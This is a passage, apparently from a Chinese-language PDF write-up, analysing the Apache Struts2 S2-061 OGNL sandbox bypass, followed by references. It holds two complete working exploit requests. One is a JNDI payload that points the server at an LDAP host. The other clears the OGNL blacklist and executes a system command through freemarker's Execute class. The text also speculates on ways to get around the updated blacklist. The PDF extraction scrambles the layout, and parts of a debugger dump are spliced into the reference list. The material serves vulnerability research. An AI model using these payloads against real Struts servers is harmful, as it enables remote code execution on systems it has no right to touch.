1
2
3
4
            register2
5
6
7
8
9
这下我们就知道了补丁中为什么要净化namespace的原因，继续跟踪namespace的去向,执⾏
链会到ServletActionRedirectResult的⽗类的⽗类
org.apache.struts2.result.StrutsResultSupport#execute⽅法中
继续跟进 this.conditionalParse
看到了很熟悉的TextParseUtil.translateVariables，执⾏表达式，但是在这⾥正题出现了，沙
箱与⿊名单
translateVariables有⼀系列的重载，最终我们到了
com.opensymphony.xwork2.util.TextParseUtil.ParsedValueEvaluator#evaluate
2.13 S2-061 
这篇⽂章将OGNL沙箱的绕过写的真的很详细
https://www.anquanke.com/post/id/169735#h3-1
接下来重点分析061  这个事JNDI的POC  主要参考梁师傅⽂章
https://www.cnblogs.com/potatsoSec/p/14111163.html
POST /SimpleStruts_war_exploded/S2061.action HTTP/1.1
1
Host: localhost:8083
2
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 
(KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
3
Accept-Encoding: gzip, deflate
4
Accept-Language: zh-CN,zh;q=0.9
5
Cookie: JSESSIONID=0DD7F8E6B11D062C574037318DC36C2D
6
Content-Type: multipart/form-data; boundary=----
WebKitFormBoundaryl7d1B1aGsV2wcZwF
7
Content-Length: 390
8
9
------WebKitFormBoundaryl7d1B1aGsV2wcZwF
10
Content-Disposition: form-data; name="id"
11
12
%{('Powered_by_Unicode_Potats0,enjoy_it').(#UnicodeSec = 
#application['org.apache.tomcat.InstanceManager']).
(#rw=#UnicodeSec.newInstance('com.sun.rowset.JdbcRowSetImpl')).
(#rw.setDataSourceName('ldap://127.0.0.1:9999/UnicodeSec')).
(#rw.getDatabaseMetaData())}
13
这个是CC 的POC
已知Ongl沙盒的限制如下
 ⽆法new⼀个对象
 ⽆法调⽤⿊名单类和包的⽅法、属性
 ⽆法调⽤静态⽅法
 ⽆法直接执⾏命令
 ⽆法调⽤⽅法属性⾮public的⽅法
⽬前⿊名单⻓这样
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
14
POST /SimpleStruts_war_exploded/S2061.action HTTP/1.1
1
Host: localhost:8083
2
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 
(KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
3
Accept-Encoding: gzip, deflate
4
Accept-Language: zh-CN,zh;q=0.9
5
Cookie: JSESSIONID=0DD7F8E6B11D062C574037318DC36C2D
6
Content-Type: multipart/form-data; boundary=----
WebKitFormBoundaryl7d1B1aGsV2wcZwF
7
Content-Length: 390
8
9
------WebKitFormBoundaryl7d1B1aGsV2wcZwF
10
Content-Disposition: form-data; name="id"
11
12
%{('Powered_by_Unicode_Potats0,enjoy_it').(#UnicodeSec = 
#application['org.apache.tomcat.InstanceManager']).
(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap'
)).(#stackvalue=#attr['struts.valueStack']).
(#potats0.setBean(#stackvalue)).(#context=#potats0.get('context')).
(#potats0.setBean(#context)).(#sm=#potats0.get('memberAccess')).
(#emptySet=#UnicodeSec.newInstance('java.util.HashSet')).
(#potats0.setBean(#sm)).(#potats0.put('excludedClasses',#emptySet)).
(#potats0.put('excludedPackageNames',#emptySet)).
(#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute')).
(#cmd={'whoami'}).(#res=#exec.exec(#cmd))}
13
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
14
个⼈认为061关键的绕过点为绕过了new创建对象
在context的application中，org.apache.tomcat.SimpleInstanceManager的实例代码如下，
可以实例化⼀个⽆参构造函数。
然后将⿊名单置空，剩下和别的思路⼀样了，这个是CC的思路
JNDI注⼊POC更简单直接，只需要⼀个 org.apache.tomcat.InstanceManager
那么问题来了，更新了最新的⿊名单，还有没有可能绕过去呢？
⾸先第⼀个思路想到的是，找⼀个类似于org.apache.tomcat.InstanceManager 中的
newinstance⽅法，我先本地构造了⼀个evil类
@Override
1
    public Object newInstance(String className) throws 
IllegalAccessException,
2
            InvocationTargetException, NamingException, 
InstantiationException,
3
            ClassNotFoundException, NoSuchMethodException  {
4
        Class clazz = 
Thread.currentThread().getContextClassLoader().loadClass(className);
5
        return prepareInstance(clazz.getConstructor().newInstance());
6
    }
7
%{('Powered_by_Unicode_Potats0,enjoy_it').(#UnicodeSec = 
#application['org.apache.tomcat.InstanceManager']).
(#rw=#UnicodeSec.newInstance('com.sun.rowset.JdbcRowSetImpl')).
(#rw.setDataSourceName('ldap://127.0.0.1:9999/UnicodeSec')).
(#rw.getDatabaseMetaData())}
1
但是问题来了，我怎么获取到这个类.......，沙箱的防御机制禁⽌了new⼀个类，我们回头看
POC中是怎么样获取的，#UnicodeSec = 
#application['org.apache.tomcat.InstanceManager'])
通过#application，以我对OGNL的了解，#后⾯还能跟别的东⻄，然后请教了梁师傅，在
com.opensymphony.xwork2.util.TextParseUtil#translateVariables(char[], java.lang.String, 
com.opensymphony.xwork2.util.ValueStack, java.lang.Class, 
com.opensymphony.xwork2.util.TextParseUtil.ParsedValueEvaluator, int)下断点，查看
context，这些是我们可⽤的
这⾥将attr打印出来
AttributeMap {request=
{javax.servlet.forward.context_path=/SimpleStruts_war_exploded, 
javax.servlet.forward.mapping=org.apache.catalina.core.ApplicationMappingI
mpl@43845cde, 
javax.servlet.forward.request_uri=/SimpleStruts_war_exploded/S2061.action, 
struts.actionMapping=ActionMapping{name='S2061', namespace='/', 
method='null', extension='action', params={}, result=null}, 
__cleanup_recursion_counter=1, 
javax.servlet.forward.servlet_path=/S2061.action, 
1
struts.request_uri=/SimpleStruts_war_exploded/S2061.action, 
struts.valueStack=com.opensymphony.xwork2.ognl.OgnlValueStack@48f1dd70, 
struts.view_uri=S2061.jsp}, session={}, application=
{.freemarker.JspTaglibs=freemarker.ext.jsp.TaglibFactory@4e47b1ff, 
org.apache.jasper.compiler.TldCache=org.apache.jasper.compiler.TldCache@16
596916, 
org.apache.tomcat.InstanceManager=org.apache.catalina.core.DefaultInstance
Manager@34159831, org.apache.catalina.webappVersion=, 
org.apache.catalina.jsp_classpath=/D:/java/apache-tomcat-
8.5.57/lib/;/D:/java/apache-tomcat-8.5.57/lib/annotations-
api.jar;/D:/java/apache-tomcat-8.5.57/lib/catalina-
ant.jar;/D:/java/apache-tomcat-8.5.57/lib/catalina-ha.jar;/D:/java/apache-
tomcat-8.5.57/lib/catalina-storeconfig.jar;/D:/java/apache-tomcat-
8.5.57/lib/catalina-tribes.jar;/D:/java/apache-tomcat-
8.5.57/lib/catalina.jar;/D:/java/apache-tomcat-8.5.57/lib/ecj-
4.6.3.jar;/D:/java/apache-tomcat-8.5.57/lib/el-api.jar;/D:/java/apache-
tomcat-8.5.57/lib/jasper-el.jar;/D:/java/apache-tomcat-
8.5.57/lib/jasper.jar;/D:/java/apache-tomcat-8.5.57/lib/jaspic-
api.jar;/D:/java/apache-tomcat-8.5.57/lib/jsp-api.jar;/D:/java/apache-
tomcat-8.5.57/lib/servlet-api.jar;/D:/java/apache-tomcat-
8.5.57/lib/tomcat-api.jar;/D:/java/apache-tomcat-8.5.57/lib/tomcat-
coyote.jar;/D:/java/apache-tomcat-8.5.57/lib/tomcat-
dbcp.jar;/D:/java/apache-tomcat-8.5.57/lib/tomcat-i18n-
de.jar;/D:/java/apache-tomcat-8.5.57/lib/tomcat-i18n-
es.jar;/D:/java/apache-tomcat-8.5.57/lib/tomcat-i18n-
fr.jar;/D:/java/apache-tomcat-8.5.57/lib/tomcat-i18n-
ja.jar;/D:/java/apache-tomcat-8.5.57/lib/tomcat-i18n-
ko.jar;/D:/java/apache-tomcat-8.5.57/lib/tomcat-i18n-
ru.jar;/D:/java/apache-tomcat-8.5.57/lib/tomcat-i18n-zh-
CN.jar;/D:/java/apache-tomcat-8.5.57/lib/tomcat-jdbc.jar;/D:/java/apache-
tomcat-8.5.57/lib/tomcat-jni.jar;/D:/java/apache-tomcat-8.5.57/lib/tomcat-
util-scan.jar;/D:/java/apache-tomcat-8.5.57/lib/tomcat-
util.jar;/D:/java/apache-tomcat-8.5.57/lib/tomcat-
websocket.jar;/D:/java/apache-tomcat-8.5.57/lib/websocket-
api.jar;/D:/java/apache-tomcat-8.5.57/bin/bootstrap.jar;/D:/java/apache-
tomcat-8.5.57/bin/tomcat-
juli.jar;/C:/Users/Administrator/AppData/Local/JetBrains/IntelliJIdea2020.
1/captureAgent/debugger-agent.jar;/C:/Program 
Files/Java/jdk1.8.0_20/jre/lib/ext/access-bridge-64.jar;/C:/Program 
Files/Java/jdk1.8.0_20/jre/lib/ext/cldrdata.jar;/C:/Program 
Files/Java/jdk1.8.0_20/jre/lib/ext/dnsns.jar;/C:/Program 
Files/Java/jdk1.8.0_20/jre/lib/ext/jaccess.jar;/C:/Program 
Files/Java/jdk1.8.0_20/jre/lib/ext/jfxrt.jar;/C:/Program 
Files/Java/jdk1.8.0_20/jre/lib/ext/localedata.jar;/C:/Program 
Files/Java/jdk1.8.0_20/jre/lib/ext/nashorn.jar;/C:/Program 
Files/Java/jdk1.8.0_20/jre/lib/ext/sunec.jar;/C:/Program 
Files/Java/jdk1.8.0_20/jre/lib/ext/sunjce_provider.jar;/C:/Program 
Files/Java/jdk1.8.0_20/jre/lib/ext/sunmscapi.jar;/C:/Program 
Files/Java/jdk1.8.0_20/jre/lib/ext/sunpkcs11.jar;/C:/Program 
抛去⿊名单的类，好像也不剩啥了.......找到⼀个
org.apache.jasper.servlet.JspCServletContext
后来发现这个这个是静态⽅法.........罢了罢了，挖出这个洞来的⼈真⽜批.......活到⽼学到⽼
3.漏洞信息跟进
 https://cwiki.apache.org/confluence/display/WW/S2-0**
 https://github.com/apache/struts/
https://cwiki.apache.org/conﬂuence/display/WW/Security+Bulletins
四、个⼈思考
以后的漏洞⼤多都⾛不到预警了，估计也都是沙箱绕过，不知道⼜会有什么绕过的⽅式，按照
061的思路是context中？root⾥？还会取到哪些可⽤的类？我看到的⼏个能⽤的都是静态⽅
法，能不能从context或root⾥获取到本地项⽬中依赖的类呢？如果可以，那可⽤的类就太多
了，就跟fastjson⼀个找法了，但是⽬前我还不知道怎么从OGNL的上下⽂或者root中获取到
这个类，不，应该说是现成的对象。
五、参考链接
https://threedr3am.github.io/2018/12/12/Struts2%20RCE%E6%BC%8F%E6%B4%9
E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%20-%200x01%E5%9F%BA%
E7%A1%80%E7%AF%87/
https://blog.csdn.net/sxb0841901116/article/details/27358697
https://www.codenong.com/p11903500/
https://xz.aliyun.com/t/2672
https://xz.aliyun.com/t/2323
https://chybeta.github.io/2018/05/08/%E3%80%90struts2-%E5%91%BD%E4%BB%
A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9
E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-003%E5%9
2%8CS3-005/
https://lorexxar.cn/2019/09/23/javaweb-S2/#S2-012
https://xz.aliyun.com/t/2694
Files/Java/jdk1.8.0_20/jre/lib/ext/zipfs.jar, 
javax.websocket.server.ServerContainer=org.apache.tomcat.websocket.server.
WsServerContainer@130b70f8, 
org.apache.jasper.compiler.ELInterpreter=org.apache.jasper.compiler.ELInte
rpreterFactory$DefaultELInterpreter@3274f993, 
freemarker.Configuration=freemarker.template.Configuration@23dece96, 
javax.servlet.context.tempdir=C:\Users\Administrator\AppData\Local\JetBrai
ns\IntelliJIdea2020.1\tomcat\Unnamed_SimpleStruts_2\work\Catalina\localhos
t\SimpleStruts_war_exploded, 
org.apache.catalina.resources=org.apache.catalina.webresources.StandardRoo
t@3973af44, 
org.apache.tomcat.JarScanner=org.apache.tomcat.util.scan.StandardJarScanne
r@5bea6370, 
org.apache.jasper.runtime.JspApplicationContextImpl=org.apache.jasper.runt
ime.JspApplicationContextImpl@65222aab, 
.freemarker.Application=freemarker.ext.servlet.ServletContextHashModel@432
6af35}}" href="/SimpleStruts_war_exploded/S2061.action
https://github.com/vulhub/vulhub/blob/master/struts2/
https://paper.seebug.org/247/
https://lucifaer.com/2018/12/12/S2-045%EF%BC%88CVE-2017-5638%EF%BC%8
9%E5%88%86%E6%9E%90/
https://zerokeeper.com/vul-analysis/analysis-of-struts2-s2052-vulnerability.html
https://zhuanlan.zhihu.com/p/146166297
https://paper.seebug.org/682/
https://www.anquanke.com/post/id/169735#h3-1
https://www.cnblogs.com/potatsoSec/p/14111163.html